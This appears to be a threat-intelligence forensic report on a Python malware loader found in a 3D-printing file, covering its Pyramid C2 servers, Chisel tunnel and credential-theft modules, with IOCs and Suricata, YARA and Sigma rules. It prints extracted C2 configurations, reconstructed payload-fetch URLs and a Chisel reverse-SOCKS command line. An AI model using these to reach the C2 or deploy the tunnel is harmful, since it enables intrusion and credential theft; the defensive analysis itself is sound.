# FORENSIC ANALYSIS REPORT
## Cybercriminal group "PINEAPPLE" - Malware JeffreyEpstein / Pyramid C2

**Analysis date**: February 13, 2026
**Analyst**: tlecavelier, cchopin
**Classification**: TLP:CLEAR

---

## 1. EXECUTIVE SUMMARY

The analysis of a malicious sample named "JeffreyEpstein" identified a command and control (C2) infrastructure operated by a group calling itself **"PINEAPPLE"**. The infrastructure relies on the open-source framework **Pyramid C2** (by @naksyn) and deploys a reverse SOCKS5 tunnel via **Chisel** to enable pivoting within compromised networks.

The C2 infrastructure is hosted on IP blocks managed by **Omegatech LTD**, a shell company registered in the Seychelles, using bulletproof hosting under **AS202412**. Two distinct C2 servers were identified, with an automatic fallback mechanism.

**All identified C2 servers are currently ACTIVE at the time of analysis.**

> **DISCOVERY CONTEXT**: This malware was discovered **embedded in a 3D printing file**. It was **never executed** on any system. The analysis below is purely preventive and intended for threat intelligence purposes. **No remediation is required.**

---

## 2. INFECTION VECTOR

> **Context**: The sample was discovered embedded in a file intended for 3D printing. The malware was **not executed** — this section describes the vector as it would have functioned if the payload had been triggered.

### 2.1 Initial dropper

The malware is distributed as a portable Python package for Windows:

| Component | Detail |
|-----------|--------|
| **Name** | JeffreyEpstein.zip (38 MB) |
| **Contents** | Complete Python 3.12 distribution + malicious script |
| **Executor** | JeffreyEpstein.exe (PE32+ x64, launches python3.12 + .py script) |
| **Script** | JeffreyEpstein.py (10 KB, main script) |
| **Distribution** | Hosted on Synology NAS at 178[.]16[.]55[.]153 |

### 2.2 Staging server

| Field | Value |
|-------|-------|
| **IP** | 178[.]16[.]55[.]153 |
| **Type** | Synology NAS with Safe Access enabled |
| **SSL certificate** | Default Synology Router, expired in 2023 |
| **Protocol** | HTTP/HTTPS |
| **Role** | Distribution of the malicious ZIP |

---

## 3. MALWARE ANALYSIS

### 3.1 Main script: JeffreyEpstein.py

**SHA256**: `36a6af23c42a0cc7d42a483c494199ab0ac966b68e96356c29f9386fde18beb7`

The script contains two obfuscated base64 blobs (prefixed with 5 junk characters) that, once decoded (base64 -> zlib decompress), reveal complete Pyramid C2 cradles.

**Obfuscation technique**: The first 5 characters of each base64 blob are "junk" intended to:
- Break base64 signatures for antivirus/EDR
- Prevent automatic decoding by sandboxes
- Evade YARA rules based on known base64 patterns

| Blob | Junk prefix | Target C2 | Encryption |
|------|-------------|-----------|------------|
| encoded_script_1 | `ABCDE` | 158[.]94[.]210[.]160 (C2 #1) | XOR |
| encoded_script_2 | `FGHIJ` | 178[.]16[.]53[.]173 (C2 #2) | Modified ChaCha20 |

### 3.2 Execution logic

```
JeffreyEpstein.exe
  └── python312.dll + JeffreyEpstein.py
      │
      ├── [Thread 1] Decode "ABCDE..." -> cradle Pyramid
      │   └── Contacts C2 #1 (158[.]94[.]210[.]160:443)
      │       └── Fetch pythonmemorymodule.py
      │           └── Fetch chisel.exe + dependencies
      │               └── In-memory injection via PythonMemoryModule
      │                   └── chisel client -> reverse SOCKS5 tunnel
      │
      ├── [Monitor Thread] Monitors log for 100s
      │   └── Searches for "[*] Loading in memory module package: pythonmemorymodule"
      │
      ├── [If Thread 1 fails] -> Thread 2 (FALLBACK)
      │   └── Decode "FGHIJ..." -> cradle Pyramid
      │       └── Contacts C2 #2 (178[.]16[.]53[.]173:443)
      │           └── Same payload chain
      │
      └── [keep_alive] Keeps the process running for 1800s (30 min)
```

### 3.3 Evasion techniques

| Technique | MITRE ATT&CK | Detail |
|-----------|--------------|--------|
| Signed binary proxy | T1218 | Execution from python.exe (Microsoft-signed binary) |
| In-memory loading | T1055 | PythonMemoryModule loads PEs without writing to disk |
| Base64 obfuscation | T1027 | 5-char junk prefix on base64 blobs |
| Zlib compression | T1027 | Payloads compressed before encoding |
| Transport encryption | T1573 | Modified XOR / ChaCha20 for C2 communications |
| HTTP on port 443 | T1571 | Simulates HTTPS without actual TLS |
| Fallback mechanism | T1008 | Two C2s with automatic failover |
| Stdout redirect | T1564 | Output redirected to log files (no visible console) |

---

## 4. C2 INFRASTRUCTURE

### 4.1 C2 #1 - Primary server (158[.]94[.]210[.]160)

| Field | Value |
|-------|-------|
| **IP** | 158[.]94[.]210[.]160 |
| **Block** | 158[.]94[.]210[.]0/24 |
| **ASN** | AS202412 (OMEGATECH-AS) |
| **Organization** | Omegatech LTD |
| **Org address** | House of Francis Room 303, Ile du Port, Mahe, Seychelles |
| **WHOIS country** | NL (Netherlands) |
| **Abuse contact** | abuse[@]omegatech[.]sc |
| **Inetnum registration** | 2025-09-19 |
| **Route registration** | 2026-01-21 |
| **LIR maintainer** | lir-tr-mgn-1-MNT (Turkey) |

#### Network fingerprint

| Attribute | Value |
|-----------|-------|
| **Open ports** | 22/tcp (SSH), 443/tcp (disguised HTTP) |
| **SSH** | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| **HTTP server** | BaseHTTP/0.6 Python/3.12.3 |
| **WWW-Authenticate** | Basic realm="Demo Realm" (Pyramid C2 signature) |
| **TLS on 443** | ABSENT - Handshake fails ("packet length too long") |
| **Actual protocol** | Cleartext HTTP on port 443 |
| **Shodan tags** | self-signed |
| **Shodan ports** | 22, 3389 (RDP), 5357 (WSDAPI), 5985 (WinRM) |
| **OS** | Ubuntu Linux |

#### Extracted C2 configuration (Payload 1)

```
pyramid_server  = '158[.]94[.]210[.]160'
pyramid_port    = '443'
pyramid_user    = 'u02a70[...REDACTED]'
pyramid_pass    = 'zgT9wi[...REDACTED]'
encryption      = 'xor'
encryptionpass  = 'yuYl4C[...REDACTED]'
chacha20IV      = b'12345678'
pyramid_http    = 'http'
encode_encrypt_url = '/727c5f/'
pyramid_module  = 'pythonmemorymodule.py'
```

#### Status: ACTIVE

The credentials above are **valid** at the time of analysis. The server responds with HTTP 200 upon correct authentication. Three payloads were successfully retrieved directly from the C2 (see section 5).

#### Threat Intelligence (AlienVault OTX)

- **50 pulses** referencing this IP (February 10-11, 2026)
- Malware families: Cobalt Strike, Remcos, AsyncRAT, Vidar, Meterpreter, ClearFake
- Tags: c2-infrastructure, threatfox
- GreyNoise: Not observed in active scanning (passive profile = C2)

### 4.2 C2 #2 - Fallback server (178[.]16[.]53[.]173)

| Field | Value |
|-------|-------|
| **IP** | 178[.]16[.]53[.]173 |
| **Block** | 178[.]16[.]53[.]0/24 |
| **ASN** | AS202412 (OMEGATECH-AS) |
| **Organization** | Omegatech LTD (same as C2 #1) |
| **Org address** | House of Francis Room 303, Ile du Port, Mahe, Seychelles |
| **WHOIS country** | NL (Netherlands) |
| **Inetnum registration** | 2025-08-19 |
| **Route registration** | 2026-01-21 |
| **LIR maintainer** | lir-tr-mgn-1-MNT (Turkey) |

#### Network fingerprint

| Attribute | Value |
|-----------|-------|
| **Open ports (nmap)** | 80/tcp (HTTP), 443/tcp (HTTPS) |
| **Shodan ports** | 137 (NetBIOS), 443, 5985 (WinRM) |
| **SSL certificate** | Default Synology Router, expired 02/02/2023 |
| **Reverse DNS** | None (NXDOMAIN) |
| **Probable OS** | Windows (WinRM + NetBIOS) |

#### Extracted C2 configuration (Payload 2)

```
pyramid_server  = '178[.]16[.]53[.]173'
pyramid_port    = '443'
pyramid_user    = 'Sfs@3a[...REDACTED]'
pyramid_pass    = '6234&3[...REDACTED]'
encryption      = 'chacha20'
encryptionpass  = '6234&3[...REDACTED]'
chacha20IV      = b'12345678'
pyramid_http    = 'http'
encode_encrypt_url = '/login/'
pyramid_module  = 'pythonmemorymodule.py'
```

#### Status: ACTIVE

The server responds on ports 80 and 443. Returns HTTP 400 Bad Request (possibly behind a reverse proxy or a non-standard Pyramid C2 configuration).

#### Threat Intelligence (AlienVault OTX)

- **29 pulses** referencing this IP (February 4, 2026)
- Malware families: Stealc, Remcos, Cobalt Strike, Meterpreter, AsyncRAT, Quasar RAT
- Tags: c2-infrastructure, threatfox
- GreyNoise: Not observed in active scanning

### 4.3 Link between the two C2s

Both servers share:
- **Same ASN**: AS202412 (OMEGATECH-AS)
- **Same organization**: Omegatech LTD, Seychelles
- **Same physical address**: House of Francis Room 303, Mahe
- **Same LIR maintainer**: lir-tr-mgn-1-MNT (Turkey)
- **Same route creation date**: 2026-01-21
- **Recent infrastructure**: Everything created between August 2025 and January 2026
- **Bulletproof hosting profile**: Shell company in Seychelles, NL IPs, Turkish LIR

---

## 5. COMPLETE C2 SERVER INVENTORY

### 5.1 Enumeration methodology

The C2 #1 server (158[.]94[.]210[.]160) has **no dashboard, admin panel, or web interface**. Pyramid C2 is a minimalist HTTP server (`BaseHTTPServer` Python) that only serves encrypted files via Basic Auth.

The inventory was performed through **authenticated enumeration**: the valid credentials from Payload 1 were used to send HTTP requests for all known module and file names from the Pyramid framework. Each filename is encrypted (XOR with the key `yuYl4C[...REDACTED]`) then base64-encoded to form the request URL. Non-empty responses are decrypted and validated (Python code, valid PE, valid ZIP).

- **Method**: Direct Basic Auth authentication on `hxxp://158[.]94[.]210[.]160:443` with credentials extracted from the malware
- **Validation**: Credentials `u02a70[...REDACTED]` / `zgT9wi[...REDACTED]` → **HTTP 200 OK** + successful exfiltration of all files listed below
- **Old credentials**: `udc945[...REDACTED]` / `vdMzDT[...REDACTED]` → **HTTP 401 Unauthorized** (credential rotation by the attacker)
- **C2 #2** (178[.]16[.]53[.]173): Responds **HTTP 400 Bad Request** consistently, credentials not validated

### 5.2 Complete attacker arsenal

The enumeration revealed **4 offensive modules**, **1 executable**, and **3 dependency archives** on the C2:

| # | File | Size | SHA256 | Role |
|---|------|------|--------|------|
| 1 | `pythonmemorymodule.py` | 14 179 B | `26e56ee2...8b1ae348` | Orchestrator — in-memory PE injection |
| 2 | `bh.py` | 25 389 B | `5876f015...ac068ffc` | BeaconHunter — EDR detection/evasion |
| 3 | `DonPAPI.py` | 23 864 B | `53f1fb36...73149d23` | DonPAPI — DPAPI credential theft |
| 4 | `secretsdump.py` | 32 301 B | `f011825d...c8620af` | Impacket secretsdump — SAM/LSA/NTDS dump |
| 5 | `chisel.exe` | 753 152 B | `5d10b66e...118179ae3` | Reverse SOCKS5 tunneling |
| 6 | `pythonmemorymodule.zip` | 67 746 B | *(dependency)* | PythonMemoryModule lib (7 files) |
| 7 | `windows.zip` | 792 875 B | *(dependency)* | PythonForWindows lib (170 files) |
| 8 | `impacket.zip` | 1 170 527 B | `d6628080...a5a59470` | Impacket lib (for secretsdump) |

#### Reconstructed attack chain

```
[Phase 1 - Initial access]
  JeffreyEpstein.exe -> python312.dll + JeffreyEpstein.py
    └── Contacts C2 -> fetch pythonmemorymodule.py

[Phase 2 - Tunneling]
  pythonmemorymodule.py -> fetch chisel.exe + dependencies
    └── In-memory injection via PythonMemoryModule
        └── chisel client 192[.]168[.]178[.]60:8000 R:socks
            └── Reverse SOCKS5 tunnel = network pivot

[Phase 3 - Post-exploitation (modules available on the C2)]
  Via the SOCKS5 tunnel, the attacker can deploy:
    ├── secretsdump.py -> SAM/LSA/NTDS.dit dump (NTLM hashes)
    ├── DonPAPI.py     -> DPAPI credential theft (Chrome, WiFi, RDP, certificates)
    └── bh.py          -> Security product detection/evasion (EDR)
```

### 5.3 Module details

#### 5.3.1 pythonmemorymodule.py (in-memory injection)

| Field | Value |
|-------|-------|
| **SHA256** | `26e56ee27e6b7a808cffe0c2cf58849c87cc1af44b4625bac68bf43a8b1ae348` |
| **Author** | @naksyn (c) 2023 |
| **Role** | Downloads chisel.exe from the C2, decrypts it, and injects it in memory via PythonMemoryModule |
| **Dependencies** | pythonmemorymodule.zip, windows.zip |

Payload configuration:
```python
inject_exe   = True
exe_name     = 'chisel.exe'
command      = ' client 192[.]168[.]178[.]60:8000 R:socks'
```

#### 5.3.2 bh.py (BeaconHunter - EDR evasion)

| Field | Value |
|-------|-------|
| **SHA256** | `5876f01535bc1ed1f0adc5c33d6ee222b423dadc75ae72a71ce8a2deac068ffc` |
| **Author** | @naksyn (c) 2022 |
| **Role** | Security product detection and evasion module (EDR, antivirus) |
| **Threat level** | Allows the attacker to identify defenses in place and adapt their techniques |

#### 5.3.3 DonPAPI.py (DPAPI credential theft)

| Field | Value |
|-------|-------|
| **SHA256** | `53f1fb36ae3e57efe2d44180a2e4b3f0e94f1037232dabfe064cbb7a73149d23` |
| **Author** | @snovvcrash (c) 2022 |
| **Role** | Extraction of credentials protected by Windows DPAPI |
| **Targets** | Chrome/Edge passwords, WiFi keys, RDP credentials, certificates, Windows vaults |
| **Threat level** | Direct access to user secrets without requiring privilege escalation |

#### 5.3.4 secretsdump.py (NTLM hash dump)

| Field | Value |
|-------|-------|
| **SHA256** | `f011825da791a81f9adf4921a5fcc3262f8170f8014e6515c6fedbe9bc8620af` |
| **Author** | Diego Capriotti @naksyn (c) 2022, based on Impacket |
| **Role** | Hash extraction from SAM, LSA secrets, and NTDS.dit (Active Directory) |
| **Dependency** | impacket.zip (1.17 MB) |
| **Threat level** | Enables pass-the-hash, offline cracking, and AD domain compromise |

#### 5.3.5 chisel.exe (tunneling)

| Field | Value |
|-------|-------|
| **SHA256** | `5d10b66e95cec6e2e5b5709ce546df7c2bb27c26e1c732ada98a4bc118179ae3` |
| **Size** | 753 152 bytes |
| **Type** | PE32+ executable for MS Windows 6.00 (GUI), x86-64 |
| **Command** | `chisel client 192[.]168[.]178[.]60:8000 R:socks` |
| **Imported DLLs** | kernel32.dll, shell32.dll, wininet.dll, crypt32.dll, ole32.dll |
| **Injection** | Loaded in memory via PythonMemoryModule (no file on disk) |

**Objective**: Establish a reverse SOCKS5 proxy allowing the attacker to pivot within the victim's internal network via `192[.]168[.]178[.]60:8000`.

### 5.4 Files not found on the C2

The enumeration also tested for the presence of many common offensive tools that were **not** deployed on this C2:

- No Mimikatz, Rubeus, SharpHound, Seatbelt, Certify, SharpUp
- No shellcode, beacon, reverse shell, keylogger
- No persistence, privesc, or additional exfiltration tools
- No lazagne, smbclient, wmiexec

This suggests a **targeted and minimalist toolkit**: initial access (chisel), credential theft (secretsdump + DonPAPI), and evasion (bh).

---

## 6. COMMUNICATION ENCRYPTION

### 6.1 C2 #1: XOR

- **Algorithm**: Simple XOR with cyclic key
- **Key**: `yuYl4C[...REDACTED]` (33 bytes)
- **Weaknesses**: Trivially breakable by frequency analysis or known-plaintext attack

### 6.2 C2 #2: Modified ChaCha20

- **Algorithm**: ChaCha20 with **3 rounds** instead of 20 (standard)
- **Key**: `6234&3[...REDACTED]` (22 chars, padded to 32 bytes)
- **IV**: `12345678` (STATIC - same IV for all messages)
- **Weaknesses**:
  - 3 rounds = cryptographically weak (standard = 20 rounds)
  - Static IV = same plaintext produces same ciphertext (deterministic)
  - Key reused as authentication password (see hashes in appendix 11.1)

### 6.3 Transport

Both C2s use **cleartext HTTP on port 443**, without TLS. This allows:
- Bypassing firewalls that allow port 443
- Being detected by DPI/IDS since the traffic is NOT TLS-encrypted

---

## 7. MITRE ATT&CK TECHNIQUES

| ID | Technique | Usage |
|----|-----------|-------|
| T1059.006 | Python | Malware execution via signed python.exe |
| T1218 | Signed Binary Proxy Execution | python.exe as execution proxy |
| T1055 | Process Injection | PythonMemoryModule in-memory injection |
| T1105 | Ingress Tool Transfer | Downloading chisel.exe from C2 |
| T1027 | Obfuscated Files or Information | Base64 + zlib + junk prefix |
| T1573.001 | Encrypted Channel: Symmetric | Modified XOR / ChaCha20 |
| T1571 | Non-Standard Port | HTTP on port 443 (without TLS) |
| T1008 | Fallback Channels | Two C2s with automatic failover |
| T1572 | Protocol Tunneling | Chisel SOCKS5 reverse tunnel |
| T1564 | Hide Artifacts | Stdout redirected to logs, no console |
| T1071.001 | Web Protocols | C2 communications via HTTP |
| T1204.002 | Malicious File | Distribution via ZIP on Synology NAS |

---

## 8. INDICATORS OF COMPROMISE (IOCs)

### 8.1 IP addresses

```
158[.]94[.]210[.]160    C2 #1 Pyramid (primary) - ACTIVE
178[.]16[.]53[.]173     C2 #2 Pyramid (fallback) - ACTIVE
178[.]16[.]55[.]153     Staging server (Synology NAS)
192[.]168[.]178[.]60    Chisel listener (attacker internal network)
```

### 8.2 Network blocks

```
158[.]94[.]210[.]0/24   OMEGATECH - AS202412
178[.]16[.]53[.]0/24    OMEGATECH - AS202412
```

### 8.3 ASN

```
AS202412          OMEGATECH-AS - Omegatech LTD
```

### 8.4 SHA256 hashes

```
# Dropper
36a6af23c42a0cc7d42a483c494199ab0ac966b68e96356c29f9386fde18beb7  JeffreyEpstein.py
d72294fb338bc2fc8896d25a7395a4db466425427e1559e77185d5135a830681  JeffreyEpstein.exe

# Modules exfiltrated from the active C2
26e56ee27e6b7a808cffe0c2cf58849c87cc1af44b4625bac68bf43a8b1ae348  pythonmemorymodule.py
5876f01535bc1ed1f0adc5c33d6ee222b423dadc75ae72a71ce8a2deac068ffc  bh.py (BeaconHunter)
53f1fb36ae3e57efe2d44180a2e4b3f0e94f1037232dabfe064cbb7a73149d23  DonPAPI.py
f011825da791a81f9adf4921a5fcc3262f8170f8014e6515c6fedbe9bc8620af  secretsdump.py

# Payloads and dependencies
5d10b66e95cec6e2e5b5709ce546df7c2bb27c26e1c732ada98a4bc118179ae3  chisel.exe
d66280801e73917850baa39fbfba728ea7a9dd95f19b6e2389fcb667a5a59470  impacket.zip
```

### 8.5 Network signatures

```
# Pyramid C2 server header
Server: BaseHTTP/0.6 Python/3.12.3

# HTTP authentication
WWW-Authenticate: Basic realm="Demo Realm"

# Authorization headers (base64 of credentials) [REDACTED - see TLP:AMBER appendix]
Authorization: Basic dTAyYTcwNTc4[...REDACTED]
Authorization: Basic U2ZzQDNhc2RA[...REDACTED]

# C2 URL paths
/727c5f/*         (C2 #1)
/login/*          (C2 #2)
/1c4947/*         (old credentials)

# User-Agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```

### 8.6 Filenames

```
# Dropper
JeffreyEpstein.zip
JeffreyEpstein.exe
JeffreyEpstein.py

# C2 modules
pythonmemorymodule.py
bh.py
DonPAPI.py
secretsdump.py

# Payloads and dependencies
chisel.exe
impacket.zip
pythonmemorymodule.zip
windows.zip

# Execution artifacts
script_output_1.log
script_output_2.log
```

---

## 9. DETECTION RULES

### 9.1 Suricata / Snort

```
# Detection Pyramid C2 #1
alert http any any -> 158[.]94[.]210[.]160 443 (
  msg:"MALWARE Pyramid C2 PINEAPPLE - C2 #1 Auth";
  content:"Authorization: Basic dTAyYTcwNTc4OTI6";
  content:"/727c5f/";
  sid:2026001; rev:1;
)

# Detection Pyramid C2 #2
alert http any any -> 178[.]16[.]53[.]173 443 (
  msg:"MALWARE Pyramid C2 PINEAPPLE - C2 #2 Auth";
  content:"Authorization: Basic U2ZzQDNhc2RBZHF3ZU";
  content:"/login/";
  sid:2026002; rev:1;
)

# Generic Pyramid C2 detection (server signature)
alert http any 443 -> any any (
  msg:"MALWARE Pyramid C2 Server Response";
  content:"BaseHTTP/0.6 Python/3.12";
  content:"Demo Realm";
  sid:2026003; rev:1;
)

# Detection of non-TLS HTTP on port 443
alert tcp any any -> any 443 (
  msg:"SUSPICIOUS HTTP (non-TLS) on port 443";
  content:"GET /"; depth:5;
  content:"Authorization: Basic";
  sid:2026004; rev:1;
)

# Detection Chisel SOCKS5 tunnel
alert tcp any any -> 192[.]168[.]178[.]60 8000 (
  msg:"MALWARE Chisel Reverse SOCKS5 Tunnel - PINEAPPLE";
  sid:2026005; rev:1;
)
```

### 9.2 YARA

```yara
rule PINEAPPLE_JeffreyEpstein_Loader {
    meta:
        description = "Detects the JeffreyEpstein loader from the PINEAPPLE group"
        author = "cchopin"
        date = "2026-02-13"
        hash = "36a6af23c42a0cc7d42a483c494199ab0ac966b68e96356c29f9386fde18beb7"

    strings:
        $group = "PINEAPPLE" ascii
        $name1 = "JeffreyEpstein" ascii
        $func1 = "execute_script" ascii
        $func2 = "monitor_logs" ascii
        $func3 = "keep_alive" ascii
        $b64_prefix1 = "ABCDEeNq" ascii
        $b64_prefix2 = "FGHIJeNq" ascii
        $decode = "encoded_script[5:]" ascii
        $target = "pythonmemorymodule" ascii
        $zlib = "zlib.decompress" ascii

    condition:
        3 of them
}

rule PINEAPPLE_Pyramid_Cradle {
    meta:
        description = "Detects a Pyramid C2 cradle configured for the PINEAPPLE infrastructure"
        author = "cchopin"
        date = "2026-02-13"

    strings:
        $pyramid1 = "pyramid_server=" ascii
        $pyramid2 = "pyramid_user=" ascii
        $pyramid3 = "pyramid_pass=" ascii
        $pyramid4 = "encode_encrypt_url=" ascii
        $pyramid5 = "encrypt_wrapper" ascii
        $ip1 = "158[.]94[.]210[.]160" ascii
        $ip2 = "178[.]16[.]53[.]173" ascii
        $user1 = "u02a7057892" ascii
        $user2 = "Sfs@3asdAdqwe" ascii
        $module = "pythonmemorymodule" ascii

    condition:
        (3 of ($pyramid*)) or (any of ($ip*) and any of ($user*)) or ($module and 2 of ($pyramid*))
}

rule PINEAPPLE_Chisel_Payload {
    meta:
        description = "Detects the chisel.exe payload served by the PINEAPPLE C2"
        author = "cchopin"
        date = "2026-02-13"
        hash = "5d10b66e95cec6e2e5b5709ce546df7c2bb27c26e1c732ada98a4bc118179ae3"

    strings:
        $mz = { 4D 5A }
        $s1 = "CoSetProxyBlanket" ascii
        $s2 = "HttpOpenRequestW" ascii
        $s3 = "HttpSendRequestW" ascii
        $s4 = "cmd.exe" ascii

    condition:
        $mz at 0 and 3 of ($s*) and filesize < 1MB
}
```

### 9.3 Sigma (Windows logs)

```yaml
title: PINEAPPLE - JeffreyEpstein Pyramid C2 Activity
id: pineapple-pyramid-c2-2026
status: experimental
description: Detects JeffreyEpstein / Pyramid C2 malware activity
author: cchopin
date: 2026-02-13
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '158[.]94[.]210[.]160'
            - '178[.]16[.]53[.]173'
            - '178[.]16[.]55[.]153'
    selection_port:
        DestinationPort: 443
    selection_process:
        Image|endswith:
            - '\python.exe'
            - '\python3.exe'
            - '\JeffreyEpstein.exe'
    condition: selection_ip or (selection_port and selection_process)
    level: critical
    tags:
        - attack.command_and_control
        - attack.t1071.001
        - attack.t1572
```

---

## 10. RECOMMENDATIONS

> **Note**: Since the malware was discovered in a 3D printing file and was **never executed**, no remediation or incident response is required. The recommendations below are for **preventive purposes only**.

### 10.1 Recommended preventive actions

1. **Block the IPs** 158[.]94[.]210[.]160, 178[.]16[.]53[.]173, 178[.]16[.]55[.]153 at the firewall level (inbound AND outbound)
2. **Block the subnets** 158[.]94[.]210[.]0/24 and 178[.]16[.]53[.]0/24 (same bulletproof operator)
3. **Block the ASN** AS202412 if possible (100% malicious infrastructure)
4. **Deploy the rules** Suricata/YARA/Sigma above to detect any future attempt
5. **Report** the IOCs to threat intelligence platforms (AbuseIPDB, ThreatFox, OTX)
6. **Raise user awareness** about the risk of malware embedded in non-executable files (3D files, archives, etc.)

### 10.2 Long-term detection

7. **Alert on non-TLS HTTP** on port 443 (strong Pyramid C2 signature)
8. **Alert on the header** `WWW-Authenticate: Basic realm="Demo Realm"` (default Pyramid signature)
9. **Monitor connections** from python.exe to external IPs on port 443
10. **Monitor the ASN** AS202412 for new IP allocations

---

## 11. APPENDICES

### 11.1 Extracted C2 credentials

| C2 | Username | Password | Encryption | Key | Status |
|----|----------|----------|------------|-----|--------|
| #1 | u02a70[...REDACTED] | zgT9wi[...REDACTED] | XOR | yuYl4C[...REDACTED] | VALID |
| #2 | Sfs@3a[...REDACTED] | 6234&3[...REDACTED] | ChaCha20 | 6234&3[...REDACTED] | Not tested (HTTP 400) |
| #1 (old) | udc945[...REDACTED] | vdMzDT[...REDACTED] | ChaCha20 | fW0w0S[...REDACTED] | EXPIRED (401) |

#### SHA256 hashes of credentials (for IOC matching)

| Credential | Redacted value | SHA256 |
|------------|----------------|--------|
| Username C2 #1 | u02a70... | `ab248515ea17f94d3332e92b958ec5abccd7694641af925f4f2e1a25d19874d1` |
| Password C2 #1 | zgT9wi... | `679c725bcfd3899832366a4691dbfa8ea63c55905fe479d1267be763dd72fac2` |
| XOR key C2 #1 | yuYl4C... | `7458b1553225cc1b481cba8d88e209d85404e1a2a7ee425fad84d7d31f03aca1` |
| Username C2 #2 | Sfs@3a... | `eed745e2ad04398b25ab22e62fd5667b13a1dbfef0fd5ac8fcfe53083d7ceb6d` |
| Password/Key C2 #2 | 6234&3... | `aed94432c2930215f11aa186c2dd469a84312623220cb9d87ce675843bfe64e1` |
| Old username C2 #1 | udc945... | `57c858397a90e91eeef8e13519ecb77d3cc896565cabc7ce8f24cc716bc7df8c` |
| Old password C2 #1 | vdMzDT... | `1cb4aa0f7ab7162fcf5df334f5bd4ccad2251e5d23493d60ccae4f80a178ca15` |
| Old key C2 #1 | fW0w0S... | `33d67563fb350232b7d75add657c599388bd24d7c24b54617c3620760ad1995d` |

> **Note**: Full credentials are available upon request under **TLP:AMBER** or **TLP:RED** classification. Contact the analysts (tlecavelier, cchopin).

#### Credential validation method

The C2 #1 credentials were validated through **direct authentication against the active C2 server** on February 13, 2026:

1. **Authentication test**: HTTP request with `Authorization: Basic` header (base64 of `u02a70[...REDACTED]:zgT9wi[...REDACTED]`) sent to `hxxp://158[.]94[.]210[.]160:443` → response **HTTP 200 OK**
2. **Proof by exfiltration**: 4 payloads were successfully downloaded and decrypted from the C2 using these credentials:
   - `pythonmemorymodule.py` (14 179 bytes) — XOR decrypted → valid Python code
   - `chisel.exe` (753 152 bytes) — XOR decrypted → valid PE32+ x64
   - `pythonmemorymodule.zip` (67 746 bytes) — XOR decrypted → valid ZIP archive (7 files)
   - `windows.zip` (792 875 bytes) — XOR decrypted → valid ZIP archive (170 files)
3. **Old credentials invalid**: The credentials `udc945[...REDACTED]` / `vdMzDT[...REDACTED]` (from a previous configuration) return **HTTP 401 Unauthorized**, indicating credential rotation by the attacker.
4. **C2 #2 not validated**: The server 178[.]16[.]53[.]173 responds **HTTP 400 Bad Request** regardless of the credentials sent, suggesting a reverse proxy or non-standard Pyramid configuration. The credentials could not be confirmed.

### 11.2 Reconstructed C2 URLs

```
# C2 #1 - Fetch module
hxxp://158[.]94[.]210[.]160:443/727c5f/CQwtBFstNysfX0EhBgIeQ14HTzgS

# C2 #1 - Fetch chisel.exe
hxxp://158[.]94[.]210[.]160:443/727c5f/HRA1BUImKDctVlo0Dh5XGx8BCSEYUVl3LB0t

# C2 #1 - Fetch ZIP dependencies
hxxp://158[.]94[.]210[.]160:443/727c5f/CQwtBFstNysfX0EhBgIeQ14HTGVGREwtIQomHAAlBhoAGDYIQS8/YAhZQw==

# C2 #2 - Fetch module (ChaCha20 encoded)
hxxp://178[.]16[.]53[.]173:443/login/<chacha20_encoded_path>
```

### 11.3 Malware directory structure

```
JeffreyEpstein.zip (38 MB)
├── JeffreyEpstein.exe          PE32+ Python launcher
├── JeffreyEpstein.py           Main malicious script
├── python3.dll                 Python 3.12 runtime
├── python312.dll               Python 3.12 runtime
├── vcruntime140_1.dll          VC++ Runtime
├── DLLs/                       Native Python modules (.pyd)
│   ├── _ssl.pyd
│   ├── _socket.pyd
│   ├── libcrypto-3.dll
│   ├── libssl-3.dll
│   └── ... (34 files)
├── Lib/                        Python standard library
│   └── ... (Python modules)
├── Scripts/                    Python scripts
│   ├── pip.exe
│   └── ...
├── tcl/                        Tcl/Tk (graphical interface)
│   └── ...
└── Doc/                        Python documentation (decoy)
    └── html/
```

### 11.4 Timeline

| Date | Event |
|------|-------|
| 2025-08-19 | Creation of block 178[.]16[.]53[.]0/24 (OMEGATECH) |
| 2025-09-19 | Creation of block 158[.]94[.]210[.]0/24 (OMEGATECH) |
| 2026-01-05 | Registration of Omegatech LTD organization |
| 2026-01-21 | Creation of BGP routes for both blocks |
| 2026-02-04 | First OTX detections for 178[.]16[.]53[.]173 (C2 #2) |
| 2026-02-10 | First OTX detections for 158[.]94[.]210[.]160 (C2 #1) |
| 2026-02-13 | JeffreyEpstein.py modification (timestamp in the ZIP) |
| 2026-02-13 | Forensic analysis (this report) |

---

*End of report*
*Written on February 13, 2026*
